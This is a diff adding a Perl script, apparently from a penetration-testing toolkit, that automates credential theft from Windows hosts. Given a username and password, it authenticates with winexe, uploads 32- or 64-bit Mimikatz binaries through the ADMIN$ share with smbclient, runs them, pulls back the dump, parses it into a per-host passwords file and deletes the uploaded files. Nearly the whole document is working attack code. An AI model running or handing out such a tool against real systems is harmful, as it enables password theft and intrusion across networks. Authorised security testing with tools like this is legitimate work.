@@ -1,0 +1,208 @@
+#!/usr/bin/perl -w
+
+use strict;
+my $UPLOAD="/opt/neet/helpers/upload";
+
+my $host=$ARGV[0];
+my $user=$ARGV[1];
+my $pass=$ARGV[2];
+
+if (!defined($pass)){
+	print ("$0\n");
+	print ("Usage: $0 <host> <user> <password>\n");
+	exit 1;
+}
+my $WorkingDir=$ENV{'PWD'};
+my $REMOTE_DIR="_mimikatz";
+my $ERROR=1;
+my $OS="Unidentified\n";
+my $bit=32;
+my (@FILES,@RESULTS);
+my @TEMPS=("actions");
+
+my $banner="*** mimikatz -> $host ***";
+
+print "-" x length($banner) . "\n";
+print $banner . "\n";
+
+# Compensate for slashes in domain\username tuplets
+if ($user =~ /\w\\\w/){
+	$user =~ s/(\w)\\(\w)/$1\\\\$2/;
+}
+# And for quotes and shell expansions in passwords
+$pass =~ s/([\"\$])/\\$1/g;
+
+if (!authenticate()){
+	print STDERR "Couldn't authenticate.\n";
+	exit 1;
+}
+if (rmkdir()){
+	print "*** Failure to create remote directory. Exiting.\n";
+	exit 1;
+}
+
+check64();
+
+if ($bit == 32){
+	print "Deploying 32-bit version....\n";
+	@FILES=("mim32/mimikatz.exe","mim32/sekurlsa.dll","mim32/mimikatz.sys","mim32/klock.dll","mim32/kappfree.dll","mim.bat");
+	@TEMPS=("actions");
+	@RESULTS=("rawmimi-${host}.txt");
+	uploadFiles();
+	print "*** Running Mimikatz...\n";
+	rexec("mim.bat > rawmimi-${host}.txt");
+
+} elsif ($bit == 64) {
+	print "Deploying 64-bit version....\n";
+	@FILES=("mim64/mimikatz.exe","mim64/sekurlsa.dll","mim64/mimikatz.sys","mim64/klock.dll","mim64/kappfree.dll","mim.bat");
+	@RESULTS=("rawmimi-${host}.txt");
+	uploadFiles();
+	print "*** Running Mimikatz...\n";
+	rexec("mim.bat > rawmimi-${host}.txt");
+}
+
+gatherData();
+cleanup();
+
+# Finally, run mimiparse on the output
+system("mimiparse rawmimi-${host}.txt > passwords-${host}.txt 2>/dev/null");
+
+my $credit='jonnyhightower [at ]funkygeek.com';
+
+print "\n" . "-" x length($credit) . "\n";
+print $credit . "\n\n";
+
+exit $ERROR;
+
+#------------------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------
+
+sub authenticate {
+	my $return=`winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" 2>&1`;
+
+	if ($return =~ /NT_STATUS_LOGON_FAILURE/i){
+		print STDERR "Logon failure\n";
+		return 0;
+	}
+	if ($return =~ /ERROR/i){
+		return 0;
+	}
+	if ($return !~ /Windows/i){
+		return 0;
+	}
+	if ($return =~ /Windows NT Version 4.0/i){
+		$OS="NT4";
+	} elsif ($return =~ /Windows \[Version 5.2./i){
+		$OS="2003";
+	} elsif ($return =~ /Windows 2000/i){
+		$OS="2000";
+	} elsif ($return =~ /Windows XP/i){
+		$OS="XP";
+	} elsif ($return =~ /Windows \[Version 6.1.7600/i){
+		$OS="2008";
+	} elsif ($return =~ /Windows \[Version 6.0./i){
+		$OS="Vista";
+	}
+	return 1;
+}
+
+sub rexec {
+	my $cmd=shift();
+	my $rc=system("winexe --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\"");
+	$rc=$rc>>8;
+	return $rc;
+}
+
+sub silentRexec {
+	my $cmd=shift();
+	my $rc=system("winexe  --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c \\\"cd \%WINDIR\%\\${REMOTE_DIR} \& ${cmd}\\\"\" >/dev/null 2>&1");
+	$rc=$rc>>8;
+	return $rc;
+}
+
+sub check64 {
+	my $arch1=`winexe -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ECHO %PROCESSOR_ARCHITECTURE%\" 2>&1`;
+	if ($arch1 =~ /AMD64/i){
+		$bit=64;
+	} 
+	return 1;
+}
+
+sub cleanup {
+	print "*** Cleaning up the remote host $host...\n";
+	# Clean up the winexe service - delete the service
+	#silentRexec("cmd.exe /c ghsc.exe delete winexesvc"); 
+	#silentRexec("cmd.exe /c net stop winexesvc");
+	system("winexe --uninstall --ostype=2 -U \"${user}\"%\"${pass}\" //$host \"cmd.exe /c ver\" >/dev/null 2>&1");
+	for my $file (@FILES,@RESULTS,@TEMPS){
+		rdel($file);
+	}
+	return rrmdir();
+}
+
+sub gatherData {
+	print "*** Retrieving data...\n";
+	for my $file (@RESULTS){
+		download($file);
+	}
+}
+
+sub upload {
+	my $file = shift();
+	my $remote = $file;
+	if ($file =~ /\//){
+		$remote =~ s/^[\S\s]+\/(\S+)$/$1/;
+	}
+	my $rc=1;
+	if (-f "${UPLOAD}/$file"){
+		$rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"PUT ${UPLOAD}/$file $REMOTE_DIR\\$remote\" >/dev/null 2>&1");
+		$rc = $rc>>8;
+	}
+	return $rc;
+}
+
+sub download {
+	my $file = shift();
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"GET $REMOTE_DIR\\$file ${WorkingDir}/$file\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rdel {
+	my $file=shift();
+	if ($file =~ /\//){
+		$file =~ s/^[\S\s]+\/(\S+)$/$1/;
+	}
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"DEL $REMOTE_DIR\\$file \" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rmkdir {
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"MKDIR $REMOTE_DIR\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub rrmdir {
+	my $rc=system("smbclient //${host}/ADMIN\$ -U \"$user\" \"$pass\" -c \"RMDIR $REMOTE_DIR\" >/dev/null 2>&1");
+	$rc = $rc>>8;
+	return $rc;
+}
+
+sub uploadFiles {
+	for my $file (@FILES) {
+		if (upload($file)){
+			print "*** Failed to upload $file\n";
+			$ERROR=1;
+			last;
+		} else {
+			$ERROR=0;
+		}
+	}
+	if ($ERROR){
+		print "*** There was an error during the file upload process.\n";
+		exit 1;
+	}
+}
+
